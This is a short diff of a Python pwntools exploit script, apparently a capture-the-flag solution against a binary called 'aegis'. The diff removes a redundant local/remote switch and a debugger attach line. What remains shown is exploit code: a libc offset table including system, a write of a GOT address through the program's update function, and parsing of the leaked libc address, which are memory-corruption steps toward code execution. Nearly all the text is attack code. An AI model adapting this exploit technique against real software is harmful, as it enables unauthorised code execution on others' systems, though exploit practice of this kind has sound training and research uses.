@@ -17,18 +17,13 @@ pick64 = lambda x: u64(x[:8].ljust(8, '\0'))
 
 # module structure & function
 
-libc_remote = {
+libc = {
 	'base': 0x0,
 	'__libc_start_main': 0x21ab0,
 	'dtors': 0x3ece18,
 	'system': 0x4f440,
 	'attr_mangled': 0x3F0740
 }
-
-if local:
-	libc = libc_remote
-else:
-	libc = libc_remote
 
 elf = {
 	'base': 0x0,
@@ -116,8 +111,6 @@ print('[+] ELF base @ {:#x}'.format(elf['base']))
 update(1, 'AA', 0x4141414141414141)
 update(1, p64(elf['start_main_got'])[:6]+'\n', 0)
 show(0)
-
-gdb.attach('aegis', exe='./aegis', gdbscript=open('pie.x'))
 
 ru('Content: ')
 leaked = pick64(rud('\n'))
